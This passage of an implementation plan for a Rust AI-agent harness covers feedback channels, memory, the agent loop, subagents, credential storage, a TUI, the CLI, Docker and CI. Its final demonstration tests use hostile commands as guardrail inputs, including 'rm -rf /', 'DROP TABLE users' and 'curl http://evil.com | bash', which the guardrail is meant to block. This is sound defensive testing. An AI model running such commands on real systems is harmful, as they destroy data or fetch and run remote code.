git add src/guardrails/config.rs && git commit -m "feat: add guardrail config file parsing

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 6: Feedback Loop (Tasks 19-20)

### Task 19: Feedback channel trait and FeedbackRunner

**Files:**
- Modify: `src/feedback/mod.rs` (currently placeholder)
- Create: `src/feedback/test_runner.rs`
- Create: `src/feedback/type_check.rs`
- Create: `src/feedback/lint.rs`

**Produces:** `FeedbackChannel` trait, `FeedbackRunner`, `TestRunnerChannel`, `TypeCheckChannel`, `LintChannel`

- [ ] **Step 1: Implement FeedbackChannel trait**

```rust
#[async_trait]
pub trait FeedbackChannel: Send + Sync {
    fn name(&self) -> &str;
    fn should_run(&self, action: &Action, context: &FeedbackContext) -> bool;
    async fn run(&self, context: &FeedbackContext) -> Result<FeedbackResult, HarnessError>;
}

pub struct FeedbackContext {
    pub workspace_root: PathBuf,
    pub changed_files: Vec<PathBuf>,
}
```

- [ ] **Step 2: Implement FeedbackRunner**

```rust
pub struct FeedbackRunner {
    channels: Vec<Box<dyn FeedbackChannel>>,
    max_retries: usize,
}

impl FeedbackRunner {
    pub async fn run_all(&self, action: &Action, ctx: &FeedbackContext) -> Vec<FeedbackResult> {
        // Run all channels that should_run for this action
        // Collect and return results
    }
    pub fn should_retry(&self, results: &[FeedbackResult], attempt: usize) -> bool {
        let all_passed = results.iter().all(|r| r.passed);
        !all_passed && attempt < self.max_retries
    }
}
```

- [ ] **Step 3: Implement TestRunnerChannel**

- `name()` → "test_runner"
- `should_run()` → true if any `.rs` file changed
- `run()` → execute `cargo test` in workspace, parse output, extract failures with file:line
- Test: `test_runner_parses_pass`, `test_runner_parses_failures`

- [ ] **Step 4: Implement TypeCheckChannel**

- `name()` → "type_check"
- `should_run()` → true if any `.rs` file changed
- `run()` → execute `cargo check`, parse error output
- Test: `test_type_check_parses_errors`

- [ ] **Step 5: Implement LintChannel**

- `name()` → "lint"
- `should_run()` → true if any source file changed
- `run()` → execute `cargo clippy`, parse warnings
- Test: `test_lint_parses_warnings`

- [ ] **Step 6: Run tests**

Run: `cargo test`
Expected: All feedback tests PASS

- [ ] **Step 7: Commit**

```bash
git add src/feedback/ && git commit -m "feat: add feedback channels and runner

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 20: Feedback result formatting for LLM

**Files:**
- Modify: `src/feedback/mod.rs`

**Produces:** `format_feedback_for_llm()`

- [ ] **Step 1: Implement feedback formatting**

```rust
pub fn format_feedback_for_llm(results: &[FeedbackResult]) -> String {
    // Format each result as structured text for injection into LLM context
    // Include: channel name, pass/fail, specific errors with file:line:message
    // Example output:
    // "## Feedback Results:
    //  **test_runner**: FAILED
    //    - src/main.rs:42: assertion failed: expected true, got false
    //  **type_check**: PASSED"
}
```

- [ ] **Step 2: Write tests**

- Test: `test_format_passing_results` — all pass, verify output
- Test: `test_format_failing_results` — some fail, verify error details included
- Test: `test_format_empty_results`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/feedback/mod.rs && git commit -m "feat: add feedback result formatting for LLM injection

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 7: Memory System (Task 21)

### Task 21: MemoryStore with file-level persistence

**Files:**
- Modify: `src/memory/mod.rs` (currently placeholder)
- Create: `src/memory/entry.rs`

**Produces:** `MemoryStore`, `MemoryEntry`, `MemoryMetadata`, `MemoryType`

- [ ] **Step 1: Implement MemoryEntry and MemoryMetadata**

In `src/memory/entry.rs`:
```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum MemoryType { User, Feedback, Project, Reference }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemoryMetadata {
    pub mem_type: MemoryType,
    pub tags: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemoryEntry {
    pub name: String,
    pub description: String,
    pub file_path: PathBuf,
    pub metadata: MemoryMetadata,
}
```

- [ ] **Step 2: Implement MemoryStore**

In `src/memory/mod.rs`:
```rust
pub struct MemoryStore {
    root: PathBuf,
    index: Vec<MemoryEntry>,
}

impl MemoryStore {
    pub fn new(root: PathBuf) -> Self { ... }
    pub fn load_all(&mut self) -> Result<()> {
        // Read MEMORY.md index file
        // Parse each line as: "- [name](file.md) — description"
        // For each entry, read frontmatter from the .md file
    }
    pub fn search(&self, query: &str) -> Vec<&MemoryEntry> {
        // Simple keyword matching against name + description
    }
    pub fn write(&mut self, entry: MemoryEntry, content: &str) -> Result<()> {
        // Write .md file with frontmatter
        // Update MEMORY.md index
        // Add to in-memory index
    }
    pub fn compact_index(&self) -> String {
        // Generate "memory directory" text for LLM system prompt
        // One line per entry: name + description
    }
}
```

- [ ] **Step 3: Write tests**

- Test: `test_write_and_read_memory` — create temp dir, write memory, load_all, verify entry exists
- Test: `test_search_finds_relevant_entries` — write 3 entries, search for keyword, verify correct matches
- Test: `test_compact_index_format` — verify output format
- Test: `test_memory_persists_across_instances` — write, create new MemoryStore, load, verify

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All memory tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/memory/ && git commit -m "feat: add file-level memory system with index

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 8: Agent Main Loop (Task 22)

### Task 22: AgentLoop with action parser and context builder

**Files:**
- Modify: `src/loop/mod.rs` (create if placeholder)
- Create: `src/loop/parser.rs`
- Create: `src/loop/context.rs`

**Produces:** `AgentLoop`, `ActionParser`, `ContextBuilder`

- [ ] **Step 1: Implement ActionParser**

In `src/loop/parser.rs`:
```rust
pub struct ActionParser;

impl ActionParser {
    pub fn parse(response: &LlmResponse) -> Result<Action, HarnessError> {
        // 1. If response has tool_calls, parse first one as Action::ToolCall
        // 2. If response content contains <tool_call> XML tags, parse
        // 3. If response content starts with "FINAL ANSWER:", parse as FinalAnswer
        // 4. Default: return content as FinalAnswer
    }
}
```

- [ ] **Step 2: Implement ContextBuilder**

In `src/loop/context.rs`:
```rust
pub struct ContextBuilder {
    system_prompt: String,
    tool_menu: String,
    memory_index: String,
    config: HarnessConfig,
}

impl ContextBuilder {
    pub fn build(&self, messages: &[Message], user_task: &str) -> Vec<Message> {
        // Build the full context for LLM call:
        // [System]: system_prompt + tool_menu + rules + memory_index
        // [User]: user_task
        // [Assistant]: previous assistant messages
        // [Tool]: tool results
    }
}
```

- [ ] **Step 3: Implement AgentLoop**

In `src/loop/mod.rs`:
```rust
pub struct AgentLoop {
    llm: Box<dyn LlmProvider>,
    guardrails: GuardrailPipeline,
    tools: ToolRegistry,
    feedback: FeedbackRunner,
    memory: MemoryStore,
    config: HarnessConfig,
    trace_log: TraceLog,
    parser: ActionParser,
    context_builder: ContextBuilder,
}

impl AgentLoop {
    pub async fn run(&mut self, task: &str) -> Result<String, HarnessError> {
        // 1. Load config + memory
        // 2. Build initial context
        // 3. Loop:
        //    a. llm.complete(messages)
        //    b. parser.parse(response)
        //    c. guardrails.check(action)
        //    d. tools.execute(action)
        //    e. feedback.run_all(action)
        //    f. inject results into messages
        //    g. stop_judgment: FinalAnswer? max_turns? token_budget?
        // 4. Return final response
    }

    fn stop_judgment(&self, action: &Action, turn: usize, tokens_used: u32) -> bool {
        matches!(action, Action::FinalAnswer { .. }) ||
        turn >= self.config.agent.max_turns ||
        self.config.agent.token_budget.map_or(false, |b| tokens_used >= b)
    }
}
```

- [ ] **Step 4: Write integration tests with MockLlmProvider**

- Test: `test_agent_loop_simple_task` — mock LLM returns FinalAnswer, agent completes in 1 turn
- Test: `test_agent_loop_tool_call` — mock LLM returns ToolCall then FinalAnswer, verify tool executed
- Test: `test_agent_loop_guardrail_intercept` — mock LLM returns dangerous ToolCall, verify guardrail blocks
- Test: `test_agent_loop_max_turns` — mock LLM always returns ToolCall, verify stops at max_turns
- Test: `test_agent_loop_feedback_loop` — mock LLM: ToolCall(change code) → ToolCall → FinalAnswer, verify feedback runner invoked

- [ ] **Step 5: Run tests**

Run: `cargo test`
Expected: All agent loop tests PASS

- [ ] **Step 6: Commit**

```bash
git add src/loop/ && git commit -m "feat: add agent main loop with parser and context builder

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 9: Observability & Subagent (Tasks 23-24)

### Task 23: TraceLog

**Files:**
- Modify: `src/observability/mod.rs` (currently placeholder)

**Produces:** `TraceLog`, `TraceEntry`

- [ ] **Step 1: Implement TraceLog**

```rust
pub struct TraceEntry {
    pub turn: usize,
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub messages_snapshot: Vec<Message>,
    pub llm_response: String,
    pub parsed_action: Action,
    pub guard_result: GuardResult,
    pub tool_result: Option<ToolResult>,
    pub feedback_results: Vec<FeedbackResult>,
}

pub struct TraceLog {
    entries: Vec<TraceEntry>,
    output: PathBuf,
}

impl TraceLog {
    pub fn new(output: PathBuf) -> Self { ... }
    pub fn record(&mut self, entry: TraceEntry) {
        self.entries.push(entry);
        // Append JSONL to file
    }
    pub fn replay(&self) -> impl Iterator<Item = &TraceEntry> {
        self.entries.iter()
    }
}
```

- [ ] **Step 2: Write tests**

- Test: `test_trace_log_writes_jsonl`
- Test: `test_trace_log_replay`

- [ ] **Step 3: Run tests and commit**

Run: `cargo test` → PASS

```bash
git add src/observability/ && git commit -m "feat: add trace log for observability

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 24: SubagentSpawner

**Files:**
- Modify: `src/subagent/mod.rs` (currently placeholder)

**Produces:** `SubagentSpawner`, `IsolationMode`, `SubagentResult`

- [ ] **Step 1: Implement SubagentSpawner**

```rust
pub enum IsolationMode { SameProcess, Worktree }

pub struct SubagentResult {
    pub summary: String,
    pub success: bool,
}

pub struct SubagentSpawner {
    max_depth: usize,
    max_total_agents: usize,
    active_count: Arc<AtomicUsize>,
}

impl SubagentSpawner {
    pub async fn spawn(
        &self,
        task: &str,
        depth: usize,
        isolation: IsolationMode,
    ) -> Result<SubagentResult, HarnessError> {
        if depth >= self.max_depth {
            return Err(HarnessError::RecursionDepthExceeded);
        }
        if self.active_count.load(Ordering::SeqCst) >= self.max_total_agents {
            return Err(HarnessError::SubagentLimitReached);
        }
        self.active_count.fetch_add(1, Ordering::SeqCst);
        // Run agent_loop in isolated context
        // Return only summary
        self.active_count.fetch_sub(1, Ordering::SeqCst);
        // ...
    }
}
```

- [ ] **Step 2: Write tests**

- Test: `test_subagent_returns_summary`
- Test: `test_subagent_depth_limit`
- Test: `test_subagent_total_limit`

- [ ] **Step 3: Run tests and commit**

Run: `cargo test` → PASS

```bash
git add src/subagent/ && git commit -m "feat: add subagent spawner with depth and count limits

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 10: Credentials (Task 25)

### Task 25: CredentialManager with keyring and env backends

**Files:**
- Modify: `src/credentials/mod.rs` (currently placeholder)
- Create: `src/credentials/keyring.rs`
- Create: `src/credentials/env.rs`

**Produces:** `CredentialBackend` trait, `KeyringCredentialBackend`, `EnvCredentialBackend`, `CredentialManager`

- [ ] **Step 1: Implement CredentialBackend trait**

```rust
#[async_trait]
pub trait CredentialBackend: Send + Sync {
    async fn get(&self, key: &str) -> Result<Option<String>, HarnessError>;
    async fn set(&self, key: &str, value: &str) -> Result<(), HarnessError>;
    async fn delete(&self, key: &str) -> Result<(), HarnessError>;
    fn list_keys(&self) -> Result<Vec<String>, HarnessError>;
}
```

- [ ] **Step 2: Implement EnvCredentialBackend**

Reads/writes to `.env` file. Documented as "plaintext risk, development only".

- [ ] **Step 3: Implement KeyringCredentialBackend**

Uses `keyring` crate. Handles Linux/macOS/Windows. Falls back to encrypted file if keyring unavailable.

- [ ] **Step 4: Implement CredentialManager**

```rust
pub struct CredentialManager {
    backend: Box<dyn CredentialBackend>,
}

impl CredentialManager {
    pub fn key_status(&self) -> Result<String, HarnessError> {
        // List keys, show "configured" not plaintext
    }
    pub fn key_set(&self) -> Result<(), HarnessError> {
        // Interactive: rpassword::prompt_password("Enter API key: ")
        // Store via backend
    }
    pub fn key_clear(&self, key: &str) -> Result<(), HarnessError> { ... }
}
```

- [ ] **Step 5: Write tests**

- Test: `test_env_backend_set_and_get`
- Test: `test_env_backend_delete`
- Test: `test_key_status_does_not_reveal_plaintext`

- [ ] **Step 6: Run tests and commit**

Run: `cargo test` → PASS

```bash
git add src/credentials/ && git commit -m "feat: add credential management with keyring and env backends

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 11: TUI (Tasks 26-28)

### Task 26: TUI app state and event loop

**Files:**
- Modify: `src/tui/mod.rs` (currently placeholder)
- Create: `src/tui/app.rs`

**Produces:** `App`, `AppState`, TUI event loop

- [ ] **Step 1: Implement App state**

In `src/tui/app.rs`:
```rust
pub struct AppState {
    pub messages: Vec<Message>,
    pub current_tool: Option<String>,
    pub tool_results: Vec<ToolResult>,
    pub guard_requests: Vec<ApprovalRequest>,
    pub status: StatusInfo,
    pub running: bool,
}

pub struct StatusInfo {
    pub turn: usize,
    pub tokens_used: u32,
    pub risk_level: String,
    pub model: String,
}
```

- [ ] **Step 2: Implement TUI event loop**

In `src/tui/mod.rs`:
```rust
pub async fn run_tui(agent: AgentLoop, task: String) -> Result<(), HarnessError> {
    // 1. Initialize terminal with crossterm
    // 2. Create ratatui App
    // 3. Spawn agent loop in background task
    // 4. Main event loop: draw panels, handle input
    // 5. On exit: restore terminal
}

pub fn run_cli(agent: AgentLoop, task: String) -> Result<(), HarnessError> {
    // Fallback: plain text mode for non-TTY environments
}
```

- [ ] **Step 3: Run tests and commit**

Run: `cargo test` → PASS

```bash
git add src/tui/ && git commit -m "feat: add TUI app state and event loop

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 27: TUI panels (conversation, tools, guardrails, status)

**Files:**
- Create: `src/tui/panels/mod.rs`
- Create: `src/tui/panels/conversation.rs`
- Create: `src/tui/panels/tools.rs`
- Create: `src/tui/panels/guardrails.rs`
- Create: `src/tui/panels/status.rs`

**Produces:** Four panel renderers

- [ ] **Step 1: Implement conversation panel**

Renders message list with role-based colors (User=cyan, Assistant=green, System=yellow, Tool=gray). Auto-scrolls to latest message.

- [ ] **Step 2: Implement tools panel**

Shows current tool call and recent tool results. Displays tool name, parameters, and result summary.

- [ ] **Step 3: Implement guardrails panel**

Shows pending approval requests with risk details. Highlights High/Critical risk. Waits for y/n input.

- [ ] **Step 4: Implement status bar**

Shows turn count, token usage, model, risk level on a single line at the bottom. Green for normal, yellow for Medium risk, red for High.

- [ ] **Step 5: Run tests and commit**

Run: `cargo test` → PASS

```bash
git add src/tui/panels/ && git commit -m "feat: add TUI panels for conversation, tools, guardrails, status

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 28: TUI layout and terminal setup

**Files:**
- Modify: `src/tui/mod.rs`

**Produces:** Complete TUI with layout

- [ ] **Step 1: Implement layout**

Use ratatui `Layout` with:
- 70% conversation panel (left)
- 30% split (right): top for tools, bottom for guardrails
- Status bar at bottom (1 line)

- [ ] **Step 2: Implement input handling**

Key bindings:
- `q` or `Ctrl+C` → quit
- `y` / `n` → approve/deny guardrail request
- `Enter` → confirm
- `Tab` → switch focus between panels

- [ ] **Step 3: Integrate with agent loop**

Agent loop runs in a separate tokio task, sends updates via `tokio::sync::mpsc` channel to TUI. TUI renders updates as they arrive.

- [ ] **Step 4: Run tests and commit**

Run: `cargo test` → PASS

```bash
git add src/tui/ && git commit -m "feat: add TUI layout, input handling, and agent integration

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 12: CLI Entry Point (Task 29)

### Task 29: CLI with clap

**Files:**
- Modify: `src/main.rs`

**Produces:** Complete CLI with `run`, `init`, `key` subcommands

- [ ] **Step 1: Implement CLI structure**

```rust
use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "harness", version = "0.1.0")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Run the agent with a task
    Run {
        task: String,
        #[arg(short, long)]
        config: Option<PathBuf>,
        #[arg(long)]
        no_tui: bool,
    },
    /// Initialize harness configuration
    Init,
    /// Manage API keys
    Key {
        #[command(subcommand)]
        action: KeyAction,
    },
}

#[derive(Subcommand)]
enum KeyAction {
    Status,
    Set,
    Update,
    Clear,
}
```

- [ ] **Step 2: Implement command handlers**

- `run`: load config, set up credentials, build agent, launch TUI or CLI mode
- `init`: interactive setup wizard (create config.toml, set up key, create .memory dir)
- `key status`: show which keys are configured (no plaintext)
- `key set`: interactive prompt for API key
- `key clear`: remove stored key

- [ ] **Step 3: Wire everything together**

```rust
#[tokio::main]
async fn main() -> Result<(), HarnessError> {
    tracing_subscriber::init();
    let cli = Cli::parse();
    match cli.command {
        Commands::Run { task, config, no_tui } => {
            let config = load_config(config)?;
            let agent = build_agent(config)?;
            if no_tui || !atty::is(atty::Stream::Stdout) {
                run_cli(agent, task).await
            } else {
                run_tui(agent, task).await
            }
        }
        Commands::Init => { /* setup wizard */ }
        Commands::Key { action } => { /* key management */ }
    }
}
```

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/main.rs && git commit -m "feat: add CLI with run, init, and key subcommands

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 13: Docker & CI (Tasks 30-31)

### Task 30: Dockerfile

**Files:**
- Create: `Dockerfile`
- Create: `.dockerignore`

- [ ] **Step 1: Write Dockerfile**

```dockerfile
FROM rust:1.85-alpine AS builder
RUN apk add --no-cache musl-dev pkgconfig openssl-dev
WORKDIR /app
COPY . .
RUN cargo build --release

FROM alpine:3.21
RUN apk add --no-cache ca-certificates git
COPY --from=builder /app/target/release/harness /usr/local/bin/harness
ENTRYPOINT ["harness"]
```

- [ ] **Step 2: Write .dockerignore**

```
target/
.git/
.memory/
.harness/
.env
*.md
```

- [ ] **Step 3: Verify build**

Run: `docker build -t harness-agent .`
Expected: Builds successfully

- [ ] **Step 4: Commit**

```bash
git add Dockerfile .dockerignore && git commit -m "feat: add Dockerfile for container distribution

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 31: GitHub Actions CI

**Files:**
- Create: `.github/workflows/ci.yml`

- [ ] **Step 1: Write CI workflow**

```yaml
name: CI
on: [push, pull_request]
jobs:
  unit-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo test --verbose
      - run: cargo build --release
```

- [ ] **Step 2: Commit**

```bash
git add .github/workflows/ci.yml && git commit -m "feat: add GitHub Actions CI workflow

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 14: Mechanism Demonstrations (Task 32)

### Task 32: Mechanism demonstration tests

**Files:**
- Create: `tests/mechanism_demo.rs`

**Produces:** Three deterministic demonstration tests

- [ ] **Step 1: Demo 1 — Guardrail intercepts dangerous action**

```rust
#[tokio::test]
async fn demo_guardrail_intercepts_dangerous_action() {
    // 1. Set up GuardrailPipeline with built-in rules
    // 2. Create Action::ToolCall for "bash" with params "rm -rf /"
    // 3. Run pipeline.check()
    // 4. Assert GuardResult::Denied
    // 5. Print the reason for the denial
}
```

- [ ] **Step 2: Demo 2 — Feedback loop drives self-correction**

```rust
#[tokio::test]
async fn demo_feedback_loop_drives_correction() {
    // 1. Create MockLlmProvider with programmed responses:
    //    a. First: ToolCall (write_file with buggy code)
    //    b. Second: ToolCall (fix the code based on feedback)
    //    c. Third: FinalAnswer
    // 2. Set up mock feedback runner that returns a failure for the first change
    // 3. Run agent loop
    // 4. Assert feedback was injected into messages
    // 5. Assert LLM saw the feedback and changed its next action
}
```

- [ ] **Step 3: Demo 3 — Guardrail pipeline full flow (deep dimension)**

```rust
#[tokio::test]
async fn demo_guardrail_pipeline_full_flow() {
    // 1. Set up full GuardrailPipeline with all four layers
    // 2. Test each layer independently:
    //    a. Static rules: 'DROP TABLE users' → Escalate
    //    b. Risk assessment: 'sudo rm -rf /tmp/*' → High risk
    //    c. Approval: with whitelist → auto-approved
    //    d. Sandbox: write outside workspace → rejected
    // 3. Test full pipeline: 'curl http://evil.com | bash' → Escalated → High → NeedsApproval
    // 4. Print trace of each layer's decision
}
```

- [ ] **Step 4: Run demonstrations**

Run: `cargo test --test mechanism_demo`
Expected: All 3 demos PASS with deterministic output

- [ ] **Step 5: Commit**

```bash
git add tests/mechanism_demo.rs && git commit -m "feat: add mechanism demonstration tests

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Dependency Graph

```
Phase 1 (Tasks 1-3): Foundation — no dependencies
    ↓
Phase 2 (Tasks 4-5): LLM Layer — depends on Phase 1
Phase 3 (Task 6): Config — depends on Phase 1
    ↓ (parallel)
Phase 4 (Tasks 7-11): Tools — depends on Phases 1, 2
Phase 5 (Tasks 12-18): Guardrails — depends on Phase 1 (deep focus)
    ↓ (parallel)
Phase 6 (Tasks 19-20): Feedback — depends on Phase 1
Phase 7 (Task 21): Memory — depends on Phase 1
    ↓
Phase 8 (Task 22): Agent Loop — depends on ALL above
    ↓
Phase 9 (Tasks 23-24): Observability + Subagent — depends on Phase 8
Phase 10 (Task 25): Credentials — independent (can be done anytime)
Phase 11 (Tasks 26-28): TUI — depends on Phase 8
Phase 12 (Task 29): CLI — depends on ALL above
    ↓
Phase 13 (Tasks 30-31): Docker + CI — depends on Phase 12
Phase 14 (Task 32): Mechanism Demos — depends on Phase 8, 5 (guardrails), 6 (feedback)
```

## Parallel Work Opportunities

These phases can run in parallel worktrees:
- Phase 2 (LLM) + Phase 3 (Config) + Phase 5 (Guardrails) can all start after Phase 1
- Phase 4 (Tools) + Phase 6 (Feedback) + Phase 7 (Memory) + Phase 10 (Credentials) can run in parallel
- Phase 9 (Observability) + Phase 11 (TUI) can run in parallel after Phase 8

---

## Plan Summary

| Phase | Tasks | Description | Est. Time |
|-------|-------|-------------|-----------|
| 1 | 1-3 | Scaffolding + Core Types | 30 min |
| 2 | 4-5 | LLM Abstraction | 30 min |
| 3 | 6 | Configuration | 20 min |
| 4 | 7-11 | Tool System | 45 min |
| 5 | 12-18 | **Guardrails (deep focus)** | 90 min |
| 6 | 19-20 | Feedback Loop | 30 min |
| 7 | 21 | Memory | 20 min |
| 8 | 22 | Agent Main Loop | 30 min |
| 9 | 23-24 | Observability + Subagent | 20 min |
| 10 | 25 | Credentials | 20 min |
| 11 | 26-28 | TUI | 45 min |
| 12 | 29 | CLI Entry Point | 15 min |
| 13 | 30-31 | Docker + CI | 15 min |
| 14 | 32 | Mechanism Demos | 20 min |
| **Total** | **32 tasks** | | **~7 hours** |